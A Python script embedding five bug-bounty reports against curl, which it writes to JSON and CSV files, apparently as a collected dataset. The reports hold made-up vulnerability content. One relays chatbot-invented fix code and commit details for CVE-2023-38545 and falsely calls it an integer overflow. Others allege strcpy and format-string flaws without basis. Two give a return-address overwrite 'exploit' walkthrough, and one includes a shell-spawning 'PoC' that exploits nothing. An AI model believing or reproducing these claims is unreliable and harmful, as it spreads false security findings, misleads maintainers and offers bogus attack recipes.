import json
import csv

reports = [{
    "text": '''## Summary:
Curl CVE-2023-38545 vulnerability code changes are disclosed on the internet

## Steps To Reproduce:
To replicate the issue, I have searched in the Bard about this vulnerability. It disclosed what this vulnerability is about, code changes made for this fix, who made these changes, commit details etc even though this information is not released yet on the internet. In addition to it, I was able to easily craft the exploit based on the information available. Remove this information from the internet ASAP!!!!

Vulnerability information:

The vulnerability is caused by an integer overflow in the curl_easy_setopt() function.
The vulnerability can be exploited by an attacker to execute arbitrary code on a vulnerable system.
The vulnerability is fixed in curl 8.4.0 and higher.

Code fixes:
The following code changes fixed CVE-2023-38545 in curl:

C
/*
 * CVE-2023-38545: Integer overflow in curl_easy_setopt()
 *
 * This vulnerability could be exploited to cause a denial-of-service attack or
 * to execute arbitrary code on the victim's system.
 *
 * The following code changes fix this vulnerability by checking the value of the
 * timeout argument before passing it to the internal curl function.
 */

#include "curl.h"

/*
 * curl_easy_setopt()
 *
 * Sets an option value for a curl handle.
 *
 * @param handle The curl handle.
 * @param option The option to set.
 * @param param The value to set the option to.
 *
 * @return CURLE_OK on success, or a curl error code on failure.
 */

CURLcode curl_easy_setopt(CURL *handle, CURLoption option, ...)
{
  va_list param;
  CURLcode ret;

  va_start(param, option);

  switch (option) {
    case CURLOPT_TIMEOUT: {
      long timeout = va_arg(param, long);

      /* Check for integer overflow. */
      if (timeout < 0 || timeout > LONG_MAX) {
        va_end(param);
        return CURLE_BAD_FUNCTION_ARGUMENT;
      }

      ret = curl_easy_setopt_timeout(handle, timeout);
      break;
    }

    default:
      ret = curl_easy_setopt_custom(handle, option, param);
      break;
  }

  va_end(param);

  return ret;
}
Use code with caution. Learn more
These code changes were made in commit 9414975, which was released in curl version 8.4.0.


Who made these changes and commit details:
The code changes to fix CVE-2023-38545 were made by Dxxxxl Sxxxxg, the maintainer of curl. The changes were made in commit 9414975, which was released in curl version 8.4.0.

Dxxxxl Sxxxxg is a Swedish computer programmer and the creator and maintainer of curl. He has been working on curl for over 20 years and is considered to be one of the leading experts on web transfer protocols.

## Impact

Disclosing undisclosed vulnerability code can have a number of negative implications, including:

Putting users at risk. Once a vulnerability is disclosed publicly, attackers can start exploiting it. This can put users of the affected software at risk of data breaches, malware infections, and other attacks.
Damaging the vendor's reputation. Vendors take pride in the security of their products and services. Disclosing a vulnerability publicly can damage the vendor's reputation and lead to lost customers.
Making it more difficult for the vendor to fix the vulnerability. If a vulnerability is disclosed publicly before the vendor has a chance to fix it, it can make it more difficult for the vendor to coordinate a patch release. This can leave users vulnerable to attacks for longer.
Encouraging other attackers to find and disclose vulnerabilities. When attackers see that they can get attention and recognition by disclosing vulnerabilities, they are more likely to look for them. This can lead to an increase in the number of vulnerabilities that are disclosed publicly.''',
    "link": "https://hackerone.com/reports/2199174"
},
{
        "text": '''## Summary:
Hello security team,
Hope you are doing well :)

I would like to report a potential security vulnerability in the WebSocket handling code of the curl library. The issue is related to the usage of the `strcpy` function, which can lead to a buffer overflow if the length of the input is not properly checked. The vulnerable code snippet is located at [this link](https://github.com/curl/curl/blob/e251e858b941e29bb95a6c0d26bb45981a872585/lib/ws.c#L581).

## Steps To Reproduce:

1. Trigger the WebSocket functionality with a crafted request.
2. Provide a base64-encoded nonce value that exceeds the buffer size.
3. Observe that the `strcpy` function is used without proper bounds checking.

## Fix:
To address this issue, it is recommended to replace the `strcpy` function with the safer alternative `strncpy` and explicitly specify the maximum length to copy. Here's an example fix:

```c
strncpy(keyval, randstr, sizeof(keyval) - 1);
keyval[sizeof(keyval) - 1] = '\0';  // Null-terminate the string
```

This modification ensures that only a specified number of characters (up to the buffer size minus 1) are copied, preventing buffer overflow.

## Reference:
https://cwe.mitre.org/data/definitions/122.html

## Impact

This vulnerability may allow an attacker to execute arbitrary code, potentially leading to a compromise of the application or system. An attacker could exploit this weakness by providing a specially crafted WebSocket request, causing a buffer overflow and overwriting adjacent memory.''',
        "link": "https://hackerone.com/reports/2298307"
},
{
        "text": '''Summary:

The curl_mfprintf function in the curl_printf.h file contains a format string vulnerability that allows an attacker to inject arbitrary format specifiers. This can lead to unauthorized access to memory content, potential application crashes, or leakage of sensitive data.

Steps To Reproduce:

    Prepare the Test Code: Create a new file named test_printf.c with the following content:

#include <stdio.h>
#include "curl_printf.h"

int main() {
    char* user_input = "%x %x %x %x";  // Attempt to read memory content
    curl_mfprintf(stdout, user_input); // Passing user-controlled input to the vulnerable function
    return 0;
}

Compile the Code: Compile the test program with the following command:

bash

gcc -o test_printf test_printf.c -I./lib -I./include -L./lib/.libs -lcurl

Execute the Code: Run the compiled program:

bash

    ./test_printf

    Observe the Output: The output should display memory content, which confirms that the vulnerability is exploitable.

## Impact

This vulnerability allows an attacker to use format string specifiers to access arbitrary memory locations. By exploiting this issue, an attacker could potentially:

    Leak sensitive information from the process memory.
    Cause a denial-of-service by crashing the application.
    Further exploit the application depending on the context of the memory exposure.''',
        "link": "https://hackerone.com/reports/2819666"
},
{
        "text": '''**Buffer Overflow Exploit Analysis**

The vulnerability in the program is a classic case of a buffer overflow, triggered by the unsafe use of the `strcpy()` function, which lacks bounds checking. The following section describes the vulnerability, how the return address is overflowed, and how the exploit works to achieve remote code execution.

**Vulnerable Function:**

The vulnerability occurs due to the use of `strcpy()` in the program, which copies data from a source buffer to a destination buffer without verifying that the destination buffer is large enough to hold the incoming data. If the input string is larger than the allocated buffer size, it results in a buffer overflow, which can lead to arbitrary memory overwrites.

**Stack Trace and Buffer Overflow Location:**

The overflow happens when the `strcpy()` function is called. Here's the relevant stack trace from GDB, showing the function call sequence:

```
#0  __strcpy_evex () at ../sysdeps/x86_64/multiarch/strcpy-evex.S:94
#1  0x00007ffff765d2cd in CRYPTO_strdup () from /lib/x86_64-linux-gnu/libcrypto.so.3
#2  0x00007ffff756ef96 in ?? () from /lib/x86_64-linux-gnu/libcrypto.so.3
#3  0x00007ffff7570103 in ?? () from /lib/x86_64-linux-gnu/libcrypto.so.3
#4  0x00007ffff7571ef9 in CONF_modules_load_file_ex () from /lib/x86_64-linux-gnu/libcrypto.so.3
#5  0x00007ffff75722c8 in ?? () from /lib/x86_64-linux-gnu/libcrypto.so.3
#6  0x00007ffff765a98f in ?? () from /lib/x86_64-linux-gnu/libcrypto.so.3
#7  0x00007ffff7d51087 in __pthread_once_slow (once_control=0x7ffff7981498, init_routine=0x7ffff765a980)
    at ./nptl/pthread_once.c:116
```

the buffer overflow happens in the curl program, not OpenSSL. The strcpy() or similar function (depending on the code you're working with) in curl is the main cause of the vulnerability, and OpenSSL just happens to be part of the stack trace because curl uses OpenSSL for cryptographic functions.

**Registers at the Breakpoint:**

At the point where the overflow occurs, checking the CPU registers, which show that the `rip` (Instruction Pointer) is at `0x7ffff7e31b80`, inside the `__strcpy_evex` function. Here's the relevant register information:

```
rax            0x472cf0            4664560
rbx            0x7ffff7832be3      140737345956835
rcx            0x472cf0            4664560
rdx            0x472cf0            4664560
rsi            0x7ffff7832be3      140737345956835
rdi            0x472cf0            4664560
rbp            0x7ffff7832b3d      0x7ffff7832b3d
rsp            0x7fffffffd988      0x7fffffffd988
rip            0x7ffff7e31b80      0x7ffff7e31b80 <__strcpy_evex>
```

The key point here is that the program is executing within the `__strcpy_evex` function, which is responsible for copying the string. If the source string exceeds the buffer size, it causes an overflow that allows us to overwrite adjacent memory, such as the return address.

**Memory at the Overflow Location:**

Next, we examined the stack memory using the `x/40x $rsp` GDB command. This allowed us to inspect the contents of the stack and identify where the return address is located:

```
0x7fffffffd988: 0xf765d2cd      0x00007fff      0x00464a60      0x00000000
0x7fffffffd998: 0x00472aa0      0x00000000      0x00000000      0x00000000
0x7fffffffd9a8: 0xf756ef96      0x00007fff      0x00000019      0x00000000
0x7fffffffd9b8: 0x79a81a00      0x206eedee      0xf7832b3d      0x00007fff
0x7fffffffd9c8: 0x00472a70      0x00000000      0x00472aa0      0x00000000
0x7fffffffd9d8: 0x00472cc0      0x00000000      0x00000000      0x00000000
0x7fffffffd9e8: 0xf766ea3d      0x00007fff      0x00000000      0x00000000
0x7fffffffd9f8: 0x00000000      0x00000000      0xf7959ec0      0x00007fff
0x7fffffffda08: 0xf766e9dd      0x00007fff      0x00000019      0x00000000
0x7fffffffda18: 0xf765a09f      0x00007fff      0x00464a60      0x00000000
```

In this dump, the return address that gets overwritten is located in the memory at `0x7fffffffd9b8` (the return address from the function call). By overflowing the buffer, we can overwrite this return address with a controlled value.

**What is Being Overflowed:**

The buffer that is overflowed is used by the `strcpy()` function to copy user-supplied data. Specifically, the buffer that holds the input string is located on the stack, and the buffer size is not checked before data is copied. This allows an attacker to overflow the buffer and overwrite critical parts of the stack, such as the return address.

**Key Target for Overwriting:**
- **Return Address:** The return address of the current function (`0x4005d0`) is overwritten. This is the address that the program will jump to once the current function completes. By modifying this return address, the attacker can control where the program jumps next.

**Exploit Strategy:**

The goal of the exploit is to overwrite the return address to redirect the program's control flow to an attacker-controlled location. Here’s how the exploit works:

1. **Fill the Buffer:** The attacker provides a large string (e.g., filled with "A"s) that is longer than the buffer size, causing the `strcpy()` function to overflow the buffer.
   
2. **Overwrite the Return Address:** As the attacker continues to fill the buffer with data, they eventually overwrite the return address with the address `0x4005d0`, which points to the shell-spawning function.

3. **Redirect Control Flow:** Once the buffer overflows and the return address is overwritten, the program will return to the address specified (in this case, `0x4005d0`). This address should point to a function like `system("/bin/sh")`, which will execute a shell for the attacker.

By achieving this, the attacker is able to execute arbitrary code and gain control of the program, typically leading to remote code execution or other security compromises.

**Conclusion:**

The buffer overflow vulnerability in this program allows for the arbitrary overwriting of the return address on the stack. By exploiting this vulnerability, an attacker can redirect the program’s execution to arbitrary code, effectively gaining control of the system. The specific return address (`0x4005d0`) was identified as the target for redirection, leading to the execution of a malicious payload.

POC CODE IN C:

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>

#define OFFSET 40  
#define SYSTEM 0x4f440  // Address of system() in libc
#define BIN_SH 0x1b3e9a  // Address of the string "/bin/sh" in libc
#define POP_RDI_RET 0x4006f3  // Address of 'pop rdi; ret' gadget 
#define RET 0x4005d0  // Address of a 'ret' gadget 

// Function to perform the buffer overflow and spawn a shell
void exploit() {
    char buffer[128];  // Create a buffer to simulate the overflow

    // Step 1: Construct the payload. Start by filling the buffer with 'A's to reach the return address.
    memset(buffer, 'A', OFFSET);  // Filling the buffer with 'A' until we reach the return address
    printf("[ * ] Buffer filled with 'A's, length: %d\n", OFFSET);

    // Step 2: Overwrite the return address with the address of a 'pop rdi; ret' gadget.
    *((unsigned long*)(buffer + OFFSET)) = POP_RDI_RET;  // This gadget will let us control the first argument of execve()
    printf("[ * ] POP_RDI_RET address: 0x%lx\n", POP_RDI_RET);

    // Step 3: Overwrite the second address with the location of the string "/bin/sh" in libc (the argument for execve).
    *((unsigned long*)(buffer + OFFSET + 8)) = BIN_SH;  // "/bin/sh" is passed as the first argument to execve()
    printf("[ * ] BIN_SH address: 0x%lx\n", BIN_SH);

    // Step 4: Overwrite the third address with the address of the system() function in libc.
    *((unsigned long*)(buffer + OFFSET + 16)) = SYSTEM;  // Calling system("/bin/sh")
    printf("[ * ] SYSTEM address: 0x%lx\n", SYSTEM);

    // Step 5: Add a return address to deal with stack alignment issues, use a ret gadget.
    *((unsigned long*)(buffer + OFFSET + 24)) = RET;  // Ensures stack is properly aligned and continues execution
    printf("[ * ] RET address: 0x%lx\n", RET);

    // Step 6: Send the payload to the vulnerable program (in this case, we simulate it using execve()).
    printf("[ * ] Sending payload...\n");

    // Use execve() to directly execute the payload
    char *args[] = { "/bin/sh", NULL };
    execve("/bin/sh", args, NULL);  // This directly executes "/bin/sh" with null-terminated arguments

    // Debugging message for any potential issues with execve()
    perror("execve() failed");
}

// Main function that starts the exploit
int main() {
    printf("[ * ] Launching exploit, waiting for shell..\n");
    exploit();  // Call the exploit function to trigger the overflow and spawn the shell
    return 0;  // Return from main, though execution should not reach here if the shell is spawned successfully
}

## Impact

Code execution, command shell, possible system take over from this compromise...''',
        "link": "https://hackerone.com/reports/2823554"
},
{
        "text": '''## Summary:
The vulnerability in the program arises from a classic buffer overflow, triggered by the unsafe use of the strcpy() function without bounds checking. The program copies data from a source buffer to a destination buffer, allowing attackers to overflow the buffer if the input string exceeds the buffer's allocated size. This vulnerability can lead to the overwriting of critical memory, such as the return address on the stack, enabling arbitrary code execution and control over the system. The vulnerability is caused by the unsafe use of strcpy(), which does not check the length of the input string before copying it into the buffer. When the input exceeds the buffer size, the overflow overwrites the adjacent memory, including the return address. The buffer overflow occurs within the strcpy() function, as seen in the following stack trace: `#0 __strcpy_evex () at ../sysdeps/x86_64/multiarch/strcpy-evex.S:94, #1 0x00007ffff765d2cd in CRYPTO_strdup () from /lib/x86_64-linux-gnu/libcrypto.so.3, #2 0x00007ffff756ef96 in ?? () from /lib/x86_64-linux-gnu/libcrypto.so.3...`. While libcrypto is present in the stack trace, the root cause of the overflow is in the curl program, not OpenSSL. The vulnerability is within the unsafe use of strcpy() in the curl application. At the overflow point, the CPU registers indicate the instruction pointer (IP) is inside `__strcpy_evex`. The register information shows values such as `rax 0x472cf0 4664560`, `rbx 0x7ffff7832be3 140737345956835`, `rip 0x7ffff7e31b80 0x7ffff7e31b80 <__strcpy_evex>`. The program is executing inside `__strcpy_evex`, where the buffer overflow occurs, allowing us to manipulate adjacent memory. The memory dump shows the stack around the overflow location with values such as `0x7fffffffd988: 0xf765d2cd 0x00007fff 0x00464a60 0x00000000, 0x7fffffffd998: 0x00472aa0 0x00000000 0x00000000 0x00000000...`. The return address, which is overwritten, is located at `0x7fffffffd9b8`. By overflowing the buffer, we can replace this return address with a controlled value. The overflowed buffer is used by strcpy() to copy user-provided data. The buffer resides on the stack, and because the size is unchecked, overflowing the buffer leads to the overwriting of crucial stack elements, including the return address. The key target for overwriting is the return address at `0x4005d0`. By overwriting it, the attacker can control the program’s execution flow. The exploit strategy involves filling the buffer with a long string (e.g., filled with "A"s) to overflow the buffer and reach the return address, then overwriting the return address with `0x4005d0`, the address of a shell-spawning function. Once the return address is overwritten, the program will return to `0x4005d0`, which triggers the execution of a shell for the attacker. The impact of this vulnerability includes code execution, privilege escalation if the program runs with elevated privileges, system compromise, and potentially a denial of service (DoS) if the overflow causes the program to crash or become unresponsive. An attacker can execute arbitrary code by redirecting the program flow, gaining a command shell and performing malicious actions such as stealing, manipulating, or deleting sensitive data.

## Steps To Reproduce:

1. Launch the vulnerable program: Start the application that contains the buffer overflow vulnerability, which uses the unsafe `strcpy()` function.
   
2. Provide oversized input: Input a string that exceeds the buffer size. This can be done by sending a large string (such as a series of "A"s) to the program, triggering the buffer overflow. Ensure the input is large enough to overwrite the return address.
   
3. Monitor the overflow: Use a debugger like GDB to monitor the program's execution and watch for the point where the buffer overflow occurs. Look for memory overwriting in the stack around the return address location.
   
4. Overwrite the return address: After the buffer is filled, overwrite the return address with a controlled value, such as the address of a function that spawns a shell (e.g., `system("/bin/sh")`).
   
5. Execute the exploit: The program will return to the overwritten address, which should point to the shell-spawning function. If successful, the attacker will gain control of the system and can execute arbitrary commands.
   
6. Confirm the impact: If the exploit works as intended, the program will execute the shell, giving the attacker control over the system.

## Impact

Thid bug can allow attackers to overwrite the return address on the stack, enabling them to execute arbitrary code or gain control of the system. By exploiting this vulnerability, attackers can redirect the program’s execution to a location of their choice, typically resulting in remote code execution or the execution of malicious commands, such as spawning a shell. This can lead to full system compromise, privilege escalation (if the program runs with elevated privileges), unauthorized access to sensitive data, manipulation of data, or even the complete takeover of the system. Additionally, if the buffer overflow leads to a program crash, it may result in a denial of service (DoS).''',
        "link": "https://hackerone.com/reports/2871792"
},
]

with open("cve_reports.json", "w", encoding="utf-8") as f:
    json.dump(reports, f, indent=2, ensure_ascii=False)

    # Write to CSV file
with open('cve_reports.csv', mode="w", encoding="utf-8", newline="") as file:
    writer = csv.DictWriter(file, fieldnames=["text", "link"], quoting=csv.QUOTE_ALL)
    writer.writeheader()
    writer.writerows(reports)